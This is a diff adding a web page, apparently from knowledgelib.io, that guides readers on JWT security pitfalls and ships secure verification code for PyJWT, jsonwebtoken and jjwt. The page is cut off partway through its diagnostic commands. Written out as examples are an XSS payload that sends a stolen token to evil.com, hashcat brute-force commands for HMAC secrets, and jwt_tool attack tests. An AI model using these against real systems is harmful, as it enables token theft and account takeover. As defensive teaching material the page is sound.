@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <!-- SEO essentials -->
+  <title>JWT Security Pitfalls: Common Vulnerabilities and | knowledgelib.io</title>
+  <meta name="description" content="Complete guide to JWT security pitfalls covering alg:none attacks, algorithm confusion, weak secrets, token sidejacking, header injection (JWK/JKU/KID),...">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://knowledgelib.io/software/security/jwt-security-pitfalls/2026">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="JWT Security Pitfalls: Common Vulnerabilities and | knowledgelib.io">
+  <meta property="og:description" content="Complete guide to JWT security pitfalls covering alg:none attacks, algorithm confusion, weak secrets, token sidejacking, header injection (JWK/JKU/KID), and secure verification patterns for Python, Node.js, and Java. 7 sources, all cited. Verified 2026-02-27.">
+  <meta property="og:url" content="https://knowledgelib.io/software/security/jwt-security-pitfalls/2026">
+  <meta property="og:site_name" content="knowledgelib.io">
+  <meta property="og:image" content="https://knowledgelib.io/images/og-default.png">
+  <meta property="og:locale" content="en_US">
+  <meta property="article:published_time" content="2026-02-27">
+  <meta property="article:modified_time" content="2026-02-27">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="JWT Security Pitfalls: Common Vulnerabilities and | knowledgelib.io">
+  <meta name="twitter:description" content="Complete guide to JWT security pitfalls covering alg:none attacks, algorithm confusion, weak secrets, token sidejacking, header injection (JWK/JKU/KID), and secure verification patterns for Python, Node.js, and Java. 7 sources, all cited. Verified 2026-02-27.">
+  <meta name="twitter:image" content="https://knowledgelib.io/images/og-default.png">
+
+  <!-- AI discovery hints -->
+  <meta name="ai:type" content="knowledge_unit">
+  <meta name="ai:entity_type" content="software_reference">
+  <meta name="ai:confidence" content="0.94">
+  <meta name="ai:last_verified" content="2026-02-27">
+  <meta name="ai:domain" content="software/security/JWT Security Pitfalls">
+  <meta name="ai:jurisdiction" content="global">
+  <meta name="ai:canonical_question" content="What are the common JWT security pitfalls and mitigations?">
+  <meta name="ai:aliases" content="JWT vulnerabilities and fixes; JSON Web Token security best practices; JWT alg none attack prevention; JWT algorithm confusion attack; secure JWT implementation guide; JWT token sidejacking prevention; how to secure JWTs in production; CWE-347 JWT improper verification">
+  <meta name="ai:raw" content="/api/v1/units/software/security/jwt-security-pitfalls/2026.md">
+  <meta name="ai:token_estimate" content="3800">
+  <meta name="ai:source_count" content="7">
+  <meta name="ai:freshness" content="2026-02-27">
+  <meta name="ai:temporal_status" content="stable">
+  <meta name="ai:change_sensitivity" content="medium">
+  <meta name="ai:version" content="1.0">
+  <meta name="ai:first_published" content="2026-02-27">
+  <meta name="ai:inputs_needed" content="jwt_library,signing_algorithm,token_storage">
+  <meta name="ai:constraints" content="NEVER accept alg:none in production; ALWAYS specify explicit algorithm allowlist; NEVER use HMAC secrets shorter than 256 bits; NEVER store sensitive data in JWT claims; ALWAYS validate exp/iss/aud claims; NEVER mix symmetric and asymmetric algorithms on same endpoint">
+  <meta name="ai:skip_this_unit_if" content="Need JWT creation/signing flow → software/patterns/jwt-implementation/2026; Need OAuth 2.0 token flow → software/patterns/oauth2-token-security/2026; Need general session management → software/patterns/session-management/2026">
+
+
+
+
+  <!-- Universal Commerce Protocol — agent-readiness signals (auto-generated) -->
+  <meta name="commerce:protocol" content="schema.org-offer; ucp">
+  <meta name="commerce:agent-ready" content="true">
+  <meta name="commerce:checkout-via" content="none">
+  <meta name="commerce:offers-count" content="0">
+  <!-- Agent-specific: tells agents which sections exist so they can request partial content -->
+  <meta name="ai:sections" content="tldr,constraints,quick_reference,decision_tree,step_by_step,code_examples,anti_patterns,pitfalls,diagnostic_commands,version_compat,when_to_use,caveats">
+
+  <!-- Structured data for search engines -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "name": "JWT Security Pitfalls: Common Vulnerabilities and Mitigations",
+    "headline": "JWT Security Pitfalls: Common Vulnerabilities and Mitigations",
+    "description": "Complete guide to JSON Web Token (JWT) security pitfalls covering alg:none attacks, algorithm confusion, weak secrets, token sidejacking, header injection attacks, and secure verification patterns for Python (PyJWT), Node.js (jsonwebtoken), and Java (jjwt).",
+    "keywords": ["JWT security", "JSON Web Token", "alg none attack", "algorithm confusion", "token sidejacking", "JWK injection", "JWT best practices", "CWE-347"],
+    "dateModified": "2026-02-27",
+    "datePublished": "2026-02-27",
+    "proficiencyLevel": "Expert",
+    "dependencies": "PyJWT 2.x, jsonwebtoken 9.x, jjwt 0.12.x, RFC 7519",
+    "license": "https://creativecommons.org/licenses/by-sa/4.0/",
+    "creator": {
+      "@type": "Organization",
+      "name": "knowledgelib.io",
+      "url": "https://knowledgelib.io"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "knowledgelib.io",
+      "url": "https://knowledgelib.io"
+    },
+    "citation": [
+      {
+        "@type": "WebPage",
+        "name": "JSON Web Token for Java Cheat Sheet",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+      },
+      {
+        "@type": "WebPage",
+        "name": "JWT attacks",
+        "url": "https://portswigger.net/web-security/jwt"
+      },
+      {
+        "@type": "WebPage",
+        "name": "RFC 7519 - JSON Web Token (JWT)",
+        "url": "https://datatracker.ietf.org/doc/html/rfc7519"
+      },
+      {
+        "@type": "WebPage",
+        "name": "Critical vulnerabilities in JSON Web Token libraries",
+        "url": "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+      },
+      {
+        "@type": "WebPage",
+        "name": "Testing JSON Web Tokens",
+        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens"
+      },
+      {
+        "@type": "WebPage",
+        "name": "JWT Vulnerabilities List: 2026 Security Risks & Mitigation Guide",
+        "url": "https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide"
+      },
+      {
+        "@type": "WebPage",
+        "name": "7 Ways to Avoid API Security Pitfalls when using JWT",
+        "url": "https://42crunch.com/7-ways-to-avoid-jwt-pitfalls/"
+      }
+    ]
+  }
+  </script>
+
+  <!-- Dataset structured data (for Google Dataset Search) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Dataset",
+    "name": "JWT Security Pitfalls: Common Vulnerabilities and Mitigations",
+    "description": "Structured knowledge unit on JWT security pitfalls with 12-row vulnerability checklist, secure verification patterns for Python/Node.js/Java, 5 anti-pattern pairs, and diagnostic commands for testing JWT implementations.",
+    "keywords": ["JWT security", "JSON Web Token", "alg none attack", "algorithm confusion", "token sidejacking", "JWT best practices"],
+    "temporalCoverage": "2024/2026",
+    "dateModified": "2026-02-27",
+    "datePublished": "2026-02-27",
+    "sourceOrganization": [
+      {"@type": "Organization", "name": "OWASP Foundation"},
+      {"@type": "Organization", "name": "PortSwigger"},
+      {"@type": "Organization", "name": "IETF"},
+      {"@type": "Organization", "name": "Auth0"},
+      {"@type": "Organization", "name": "Red Sentry"},
+      {"@type": "Organization", "name": "42Crunch"}
+    ],
+    "license": "https://creativecommons.org/licenses/by-sa/4.0/",
+    "creator": {
+      "@type": "Organization",
+      "name": "knowledgelib.io",
+      "url": "https://knowledgelib.io"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "knowledgelib.io",
+      "url": "https://knowledgelib.io"
+    }
+  }
+  </script>
+
+  <!-- Breadcrumb structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://knowledgelib.io/" },
+      { "@type": "ListItem", "position": 2, "name": "Software", "item": "https://knowledgelib.io/software/" },
+      { "@type": "ListItem", "position": 3, "name": "Security", "item": "https://knowledgelib.io/software/security/" },
+      { "@type": "ListItem", "position": 4, "name": "JWT Security Pitfalls" }
+    ]
+  }
+  </script>
+
+  <!-- FAQPage structured data — canonical question + aliases (auto-generated) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "What are the common JWT security pitfalls and mitigations?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "JWT vulnerabilities and fixes",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "JSON Web Token security best practices",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "JWT alg none attack prevention",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "JWT algorithm confusion attack",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "secure JWT implementation guide",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "- Bottom line: Most JWT breaches stem from just 3 mistakes: accepting the alg:none header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface."
+        }
+      }
+    ]
+  }
+  </script>
+
+
+
+
+
+  <link rel="sitemap" type="application/xml" href="/sitemap.xml">
+  <link rel="preload" href="/css/style.css?v=2" as="style">
+  <link rel="stylesheet" href="/css/style.css?v=2"></head>
+<body class="knowledge-unit software-reference">
+
+  <!-- RENDERED HTML CONTENT -- for humans and search engines.
+       AI agents should use the ai:raw meta tag to fetch the .md file. -->
+
+  
+  <main role="main">
+
+<h1>JWT Security Pitfalls: Common Vulnerabilities and Mitigations</h1>
+
+  <h2 id="canonical-question-heading" class="canonical-question">What are the common JWT security pitfalls and mitigations?</h2>
+
+  <aside class="unit-meta" data-card-id="software/security/jwt-security-pitfalls/2026" aria-label="Knowledge unit metadata">
+    <span><strong>Type:</strong> Software Reference</span>
+    <span><strong>Confidence:</strong> <span class="confidence-badge" aria-label="Confidence score 0.94 out of 1">0.94</span></span>
+    <span><strong>Sources:</strong> 7</span>
+    <span><strong>Verified:</strong> <span id="verified-date">2026-02-27</span></span>
+    <span><strong>Freshness:</strong> 2026-02-27</span>
+  </aside>
+
+  <!-- TL;DR -- agents: parse this section for a quick answer -->
+  <section id="tldr">
+  <h2>TL;DR</h2>
+  <ul>
+    <li><strong>Bottom line</strong>: Most JWT breaches stem from just 3 mistakes: accepting the <code>alg:none</code> header, failing to whitelist algorithms (enabling HMAC/RSA confusion), and using weak signing secrets -- fix these and you eliminate ~80% of JWT attack surface.</li>
+    <li><strong>Key tool/command</strong>: <code>jwt.decode(token, key, algorithms=["RS256"])</code> -- always pass an explicit <code>algorithms</code> allowlist; never let the token dictate which algorithm to use.</li>
+    <li><strong>Watch out for</strong>: Algorithm confusion attacks where an attacker switches RS256 to HS256 and signs with the public key, producing a token the server validates as legitimate.</li>
+    <li><strong>Works with</strong>: All JWT libraries (PyJWT 2.x+, jsonwebtoken 9.x+, java-jwt 4.x+, jjwt 0.12+, golang-jwt 5.x+). RFC 7519 compliant.</li>
+  </ul>
+  </section>
+
+  <!-- Constraints -- agents: read before recommending any action -->
+  <section id="constraints">
+  <h2>Constraints</h2>
+  <ul>
+    <li>NEVER accept tokens with <code>alg:none</code> in production -- always reject unsigned JWTs</li>
+    <li>ALWAYS specify an explicit algorithm allowlist when verifying -- never derive the algorithm from the token header</li>
+    <li>NEVER use symmetric HMAC secrets shorter than 256 bits (32 bytes) -- weak secrets are brute-forceable in minutes</li>
+    <li>NEVER store sensitive data (passwords, PII, credit card numbers) in JWT claims -- the payload is Base64-encoded, not encrypted</li>
+    <li>ALWAYS validate <code>exp</code>, <code>iss</code>, and <code>aud</code> claims during verification -- missing validation enables token reuse across services</li>
+    <li>NEVER mix symmetric (HS*) and asymmetric (RS*, ES*, PS*) algorithms on the same verification endpoint</li>
+  </ul>
+  </section>
+
+  <!-- Quick Reference -- the core lookup table -->
+  <section id="quick-reference">
+  <h2>Quick Reference</h2>
+  <div class="table-wrap">
+  <table aria-label="Reference table">
+    <thead>
+      <tr><th scope="col">#</th><th scope="col">Vulnerability</th><th scope="col">Risk</th><th scope="col">Vulnerable Pattern</th><th scope="col">Secure Pattern</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>1</td><td><code>alg:none</code> acceptance</td><td>Critical</td><td>Library accepts unsigned tokens</td><td>Reject <code>none</code> algorithm; use <code>algorithms</code> allowlist</td></tr>
+      <tr><td>2</td><td>Algorithm confusion (RS256 to HS256)</td><td>Critical</td><td>Server uses token header to pick algorithm</td><td>Hard-code expected algorithm in verification config</td></tr>
+      <tr><td>3</td><td>Weak HMAC secret</td><td>High</td><td><code>secret = "mysecret"</code></td><td>Use 256+ bit key from CSPRNG: <code>openssl rand -base64 64</code></td></tr>
+      <tr><td>4</td><td>Missing <code>exp</code> validation</td><td>High</td><td>Token never expires</td><td>Set short-lived tokens (5-15 min) + refresh tokens</td></tr>
+      <tr><td>5</td><td>JWK header injection</td><td>High</td><td>Server trusts <code>jwk</code> parameter in token header</td><td>Ignore embedded JWK; use server-side JWKS only</td></tr>
+      <tr><td>6</td><td>JKU header injection</td><td>High</td><td>Server fetches keys from attacker-controlled URL</td><td>Whitelist allowed <code>jku</code> URLs; pin JWKS endpoint</td></tr>
+      <tr><td>7</td><td>KID parameter injection</td><td>High</td><td><code>kid</code> used in SQL query or file path unsanitized</td><td>Validate <code>kid</code> against allowlist; never use in SQL/file ops</td></tr>
+      <tr><td>8</td><td>Sensitive data in claims</td><td>Medium</td><td><code>{"ssn": "123-45-6789"}</code> in payload</td><td>Use opaque token IDs; store sensitive data server-side</td></tr>
+      <tr><td>9</td><td>Token stored in localStorage</td><td>Medium</td><td>XSS can read <code>localStorage.getItem("token")</code></td><td>Use HttpOnly + Secure + SameSite cookies</td></tr>
+      <tr><td>10</td><td>No token revocation</td><td>Medium</td><td>Compromised token valid until <code>exp</code></td><td>Maintain server-side denylist keyed by <code>jti</code></td></tr>
+      <tr><td>11</td><td>Missing <code>iss</code>/<code>aud</code> validation</td><td>Medium</td><td>Token accepted by any service</td><td>Verify <code>iss</code> matches expected issuer; <code>aud</code> matches your service</td></tr>
+      <tr><td>12</td><td>Token sidejacking</td><td>Medium</td><td>Stolen JWT grants full access</td><td>Bind token to client fingerprint via hardened cookie</td></tr>
+    </tbody>
+  </table>
+  </div>
+  </section>
+
+  <!-- Decision Tree -- structured decision logic -->
+  <section id="decision-tree">
+  <h2>Decision Tree</h2>
+  <pre><code>START: What JWT security concern are you addressing?
+&#9500;&#9472;&#9472; Token verification is failing or bypassed?
+&#9474;   &#9500;&#9472;&#9472; alg:none accepted? &#8594; Reject none; enforce algorithms allowlist
+&#9474;   &#9500;&#9472;&#9472; Algorithm confusion (HS256 vs RS256)? &#8594; Hard-code algorithm; separate HS/RS endpoints
+&#9474;   &#9492;&#9472;&#9472; Signature not verified at all? &#8594; Use verify(), NOT decode()
+&#9500;&#9472;&#9472; Token stolen or reusable across services?
+&#9474;   &#9500;&#9472;&#9472; No expiry set? &#8594; Add exp claim (5-15 min); use refresh tokens
+&#9474;   &#9500;&#9472;&#9472; No audience validation? &#8594; Validate aud claim on every request
+&#9474;   &#9500;&#9472;&#9472; Stored in localStorage? &#8594; Move to HttpOnly + Secure + SameSite cookie
+&#9474;   &#9492;&#9472;&#9472; No revocation mechanism? &#8594; Implement jti-based denylist
+&#9500;&#9472;&#9472; Header parameter injection?
+&#9474;   &#9500;&#9472;&#9472; jwk in header trusted? &#8594; Ignore jwk; use server-side JWKS only
+&#9474;   &#9500;&#9472;&#9472; jku pointing to external URL? &#8594; Whitelist jku URLs
+&#9474;   &#9492;&#9472;&#9472; kid used in SQL/file path? &#8594; Validate kid against allowlist
+&#9500;&#9472;&#9472; Sensitive data exposure?
+&#9474;   &#9500;&#9472;&#9472; PII in claims? &#8594; Remove; use opaque references + server-side lookup
+&#9474;   &#9492;&#9472;&#9472; Internal architecture in claims? &#8594; Replace with UUIDs; use generic roles
+&#9492;&#9472;&#9472; DEFAULT &#8594; Apply all constraints above + short token lifetime + HTTPS only</code></pre>
+  </section>
+
+  <!-- Step-by-Step Guide -->
+  <section id="step-by-step">
+  <h2>Step-by-Step Guide</h2>
+
+  <h3>1. Enforce algorithm allowlists on every verification call</h3>
+  <p>The most critical defense: never let the token header dictate which algorithm the server uses. Specify allowed algorithms explicitly. [<a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">src4</a>]</p>
+  <pre><code class="language-python">import jwt  # PyJWT &gt;= 2.4.0
+
+# SECURE: explicit algorithm allowlist
+payload = jwt.decode(
+    token,
+    key=public_key,
+    algorithms=["RS256"],  # NEVER omit this parameter
+    audience="https://api.example.com",
+    issuer="https://auth.example.com"
+)</code></pre>
+  <p><strong>Verify</strong>: Craft a token with <code>"alg": "none"</code> and empty signature -- your server should reject it with an algorithm mismatch error.</p>
+
+  <h3>2. Use strong signing keys</h3>
+  <p>For HMAC (symmetric) algorithms, the key must be at least 256 bits. For RSA, use 2048-bit keys minimum (4096-bit recommended). [<a href="https://portswigger.net/web-security/jwt">src2</a>]</p>
+  <pre><code class="language-bash"># Generate a strong HMAC secret (64 bytes = 512 bits)
+openssl rand -base64 64
+
+# Generate an RSA 4096-bit key pair
+openssl genrsa -out private.pem 4096
+openssl rsa -in private.pem -pubout -out public.pem</code></pre>
+  <p><strong>Verify</strong>: Attempt brute-force with <code>hashcat -a 0 -m 16500 &lt;token&gt; &lt;wordlist&gt;</code> -- should be computationally infeasible.</p>
+
+  <h3>3. Set short token lifetimes and validate temporal claims</h3>
+  <p>Access tokens should expire in 5-15 minutes. Always validate <code>exp</code>, <code>nbf</code>, and <code>iat</code>. [<a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">src1</a>]</p>
+  <pre><code class="language-python">import jwt
+from datetime import datetime, timezone, timedelta
+
+payload = {
+    "sub": user_id,
+    "iss": "https://auth.example.com",
+    "aud": "https://api.example.com",
+    "exp": datetime.now(timezone.utc) + timedelta(minutes=15),
+    "jti": str(uuid.uuid4())
+}
+token = jwt.encode(payload, private_key, algorithm="RS256")</code></pre>
+  <p><strong>Verify</strong>: Create a token with <code>exp</code> set 1 second in the past -- verification should raise <code>ExpiredSignatureError</code>.</p>
+
+  <h3>4. Implement token revocation with a jti denylist</h3>
+  <p>JWTs are stateless by design but compromised tokens remain valid until expiry. Maintain a denylist for critical operations. [<a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">src1</a>]</p>
+  <pre><code class="language-sql">CREATE TABLE revoked_tokens (
+  jti         VARCHAR(255) PRIMARY KEY,
+  revoked_at  TIMESTAMP DEFAULT NOW(),
+  expires_at  TIMESTAMP NOT NULL
+);</code></pre>
+  <p><strong>Verify</strong>: Revoke a valid token's <code>jti</code>, then attempt to use the token -- should be rejected.</p>
+
+  <h3>5. Secure client-side token storage</h3>
+  <p>Never store JWTs in localStorage (vulnerable to XSS). Use HttpOnly cookies with Secure, SameSite, and path restrictions. [<a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">src1</a>]</p>
+  <pre><code class="language-javascript">res.cookie('access_token', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'Strict',
+  maxAge: 15 * 60 * 1000,
+  path: '/api'
+});</code></pre>
+  <p><strong>Verify</strong>: Open browser DevTools &gt; Console &gt; <code>document.cookie</code> -- the token should NOT appear.</p>
+
+  <h3>6. Bind tokens to client context (anti-sidejacking)</h3>
+  <p>Generate a random fingerprint during authentication, hash it into the token, and send the raw value as a hardened cookie. [<a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">src1</a>]</p>
+  <pre><code class="language-python">import hashlib, secrets
+
+fingerprint = secrets.token_hex(32)
+fingerprint_hash = hashlib.sha256(fingerprint.encode()).hexdigest()
+
+claims = {
+    "sub": user_id,
+    "exp": ...,
+    "user_context": fingerprint_hash
+}
+# Set-Cookie: __Secure-Fgp={fingerprint}; HttpOnly; Secure; SameSite=Strict</code></pre>
+  <p><strong>Verify</strong>: Extract the JWT and replay it without the cookie -- should be rejected due to mismatched fingerprint.</p>
+  </section>
+
+  <!-- Code Examples -- multi-language, tested, copy-pasteable -->
+  <section id="code-examples">
+  <h2>Code Examples</h2>
+
+  <h3>Python/PyJWT: Secure Token Verification</h3>
+  <pre><code class="language-python">import jwt  # PyJWT &gt;= 2.4.0
+
+# Input:  JWT string, RSA public key (PEM), expected issuer and audience
+# Output: Decoded claims dict, or raises exception on invalid token
+
+def verify_token(token: str, public_key: str) -&gt; dict:
+    try:
+        payload = jwt.decode(
+            token,
+            key=public_key,
+            algorithms=["RS256"],
+            audience="https://api.example.com",
+            issuer="https://auth.example.com",
+            options={
+                "require": ["exp", "iss", "aud", "sub", "jti"],
+                "verify_exp": True,
+                "verify_iss": True,
+                "verify_aud": True,
+            }
+        )
+        if is_revoked(payload.get("jti")):
+            raise jwt.InvalidTokenError("Token has been revoked")
+        return payload
+    except jwt.ExpiredSignatureError:
+        raise
+    except jwt.InvalidTokenError as e:
+        raise</code></pre>
+
+  <h3>Node.js/jsonwebtoken: Secure Token Verification</h3>
+  <pre><code class="language-javascript">const jwt = require('jsonwebtoken');  // &gt;= 9.0.0
+
+// Input:  JWT string, RSA public key (PEM)
+// Output: Decoded payload, or throws on invalid token
+
+function verifyToken(token, publicKey) {
+  return jwt.verify(token, publicKey, {
+    algorithms: ['RS256'],
+    audience: 'https://api.example.com',
+    issuer: 'https://auth.example.com',
+    complete: false,
+    clockTolerance: 5,
+  });
+}</code></pre>
+
+  <h3>Java/jjwt: Secure Token Verification</h3>
+  <pre><code class="language-java">// jjwt &gt;= 0.12.0
+import io.jsonwebtoken.Jwts;
+import java.security.PublicKey;
+
+// Input:  JWT string, RSA public key
+// Output: Claims object, or throws SignatureException
+
+public Claims verifyToken(String token, PublicKey publicKey) {
+    return Jwts.parser()
+        .verifyWith(publicKey)
+        .requireIssuer("https://auth.example.com")
+        .requireAudience("https://api.example.com")
+        .build()
+        .parseSignedClaims(token)
+        .getPayload();
+}</code></pre>
+  </section>
+
+  <!-- Anti-Patterns -- wrong vs right code -->
+  <section id="anti-patterns">
+  <h2>Anti-Patterns</h2>
+
+  <h3>Wrong: Deriving algorithm from the token header</h3>
+  <pre><code class="language-python"># BAD -- attacker controls the algorithm by modifying the JWT header
+import jwt
+header = jwt.get_unverified_header(token)
+payload = jwt.decode(token, key, algorithms=[header["alg"]])
+# Attacker sets alg:HS256, signs with the RSA public key -&gt; accepted!</code></pre>
+
+  <h3>Correct: Hard-code the expected algorithm</h3>
+  <pre><code class="language-python"># GOOD -- server dictates the algorithm, not the token
+import jwt
+payload = jwt.decode(token, key, algorithms=["RS256"])</code></pre>
+
+  <h3>Wrong: Using decode() instead of verify()</h3>
+  <pre><code class="language-javascript">// BAD -- decode() does NOT verify the signature
+const jwt = require('jsonwebtoken');
+const payload = jwt.decode(token);  // Anyone can forge this token</code></pre>
+
+  <h3>Correct: Always use verify() with algorithm enforcement</h3>
+  <pre><code class="language-javascript">// GOOD -- verify() checks signature + claims
+const jwt = require('jsonwebtoken');
+const payload = jwt.verify(token, publicKey, { algorithms: ['RS256'] });</code></pre>
+
+  <h3>Wrong: Weak HMAC secret</h3>
+  <pre><code class="language-python"># BAD -- short secrets are brute-forceable with hashcat in minutes
+import jwt
+token = jwt.encode(payload, "secret123", algorithm="HS256")</code></pre>
+
+  <h3>Correct: Cryptographically strong secret</h3>
+  <pre><code class="language-python"># GOOD -- 512-bit key from CSPRNG
+import jwt, secrets
+signing_key = secrets.token_bytes(64)
+token = jwt.encode(payload, signing_key, algorithm="HS256")</code></pre>
+
+  <h3>Wrong: Storing JWTs in localStorage</h3>
+  <pre><code class="language-javascript">// BAD -- any XSS vulnerability can steal the token
+localStorage.setItem('token', jwt);
+// XSS payload: fetch('https://evil.com?t=' + localStorage.getItem('token'))</code></pre>
+
+  <h3>Correct: HttpOnly cookie storage</h3>
+  <pre><code class="language-javascript">// GOOD -- JavaScript cannot access HttpOnly cookies
+res.cookie('token', jwt, {
+  httpOnly: true, secure: true, sameSite: 'Strict', path: '/api'
+});</code></pre>
+
+  <h3>Wrong: No expiry or extremely long expiry</h3>
+  <pre><code class="language-python"># BAD -- token valid forever; if stolen, attacker has permanent access
+payload = {"sub": user_id}  # No exp claim
+token = jwt.encode(payload, key, algorithm="RS256")</code></pre>
+
+  <h3>Correct: Short-lived tokens with refresh flow</h3>
+  <pre><code class="language-python"># GOOD -- 15-minute access token + refresh token
+from datetime import datetime, timezone, timedelta
+payload = {
+    "sub": user_id,
+    "exp": datetime.now(timezone.utc) + timedelta(minutes=15),
+    "jti": str(uuid.uuid4())
+}
+token = jwt.encode(payload, key, algorithm="RS256")</code></pre>
+  </section>
+
+  <!-- Common Pitfalls -->
+  <section id="pitfalls">
+  <h2>Common Pitfalls</h2>
+  <ul>
+    <li><strong>Algorithm confusion on shared endpoints</strong>: A service using RS256 has its public key exposed. An attacker changes <code>alg</code> to HS256 and signs with the public key as the HMAC secret, and the server verifies successfully. Fix: Never allow both symmetric and asymmetric algorithms on the same endpoint. [<a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">src4</a>]</li>
+    <li><strong>Case-insensitive <code>alg:none</code> bypass</strong>: Libraries may reject <code>"none"</code> but accept <code>"None"</code>, <code>"nOnE"</code>, or <code>"NONE"</code>. Auth0 was vulnerable to this exact bypass. Fix: Use an algorithm allowlist (which inherently rejects all <code>none</code> variants). [<a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">src4</a>]</li>
+    <li><strong>JWK/JKU header trust</strong>: If the server fetches verification keys from the <code>jku</code> URL in the token header without validating against a whitelist, an attacker can host their own JWKS. Fix: Configure JWKS endpoints server-side; ignore <code>jku</code>/<code>jwk</code> from the token. [<a href="https://portswigger.net/web-security/jwt">src2</a>]</li>
+    <li><strong>KID injection to SQL/filesystem</strong>: If <code>kid</code> is used in a SQL query or file path, attackers can inject SQL or traverse directories to <code>/dev/null</code>. Fix: Validate <code>kid</code> against an allowlist. [<a href="https://portswigger.net/web-security/jwt">src2</a>]</li>
+    <li><strong>Accepting tokens without <code>aud</code> claim</strong>: A token issued for Service A is replayed against Service B. Fix: Always set and validate the <code>aud</code> claim specific to each service. [<a href="https://datatracker.ietf.org/doc/html/rfc7519">src3</a>]</li>
+    <li><strong>Token replay after password change</strong>: User changes password but old JWTs remain valid until <code>exp</code>. Fix: Include a password hash version claim and check it server-side, or revoke all tokens via denylist on password change. [<a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">src1</a>]</li>
+    <li><strong>Sensitive data leakage from claims</strong>: Developers place email, SSN, or internal IDs in the JWT payload, not realizing Base64 is encoding, not encryption. Fix: Use JWE or store only opaque identifiers. [<a href="https://datatracker.ietf.org/doc/html/rfc7519">src3</a>]</li>
+    <li><strong>Clock skew causing false rejections</strong>: Distributed systems with unsynchronized clocks reject valid tokens or accept expired ones. Fix: Configure a <code>clockTolerance</code> of 5-30 seconds; keep servers NTP-synced. [<a href="https://42crunch.com/7-ways-to-avoid-jwt-pitfalls/">src7</a>]</li>
+  </ul>
+  </section>
+
+  <!-- Diagnostic Commands -->
+  <section id="diagnostic-commands">
+  <h2>Diagnostic Commands</h2>
+  <pre><code class="language-bash"># Decode a JWT without verification (inspect header + payload)
+echo 'eyJhbGci...' | cut -d. -f1 | base64 -d 2&gt;/dev/null | jq .
+echo 'eyJhbGci...' | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .
+
+# Check JWT header algorithm
+echo $JWT | cut -d. -f1 | base64 -d 2&gt;/dev/null | jq -r .alg
+
+# Brute-force weak HMAC secrets with hashcat
+hashcat -a 0 -m 16500 &lt;jwt_token&gt; /usr/share/wordlists/rockyou.txt
+
+# Test for alg:none vulnerability with jwt_tool
+python3 jwt_tool.py &lt;token&gt; -X a   # Test alg:none
+python3 jwt_tool.py &lt;token&gt; -X k   # Test key confusion
+
+# Verify RSA key strength
+openssl rsa -in private.pem -text -noout | head -1
+
+# Check a JWKS endpoint for key issues
+curl -s https://auth.example.com/.well-known/jwks.json | jq '.keys[] | {kid, kty, alg, use}'
+
+# Verify token expiry from the command line
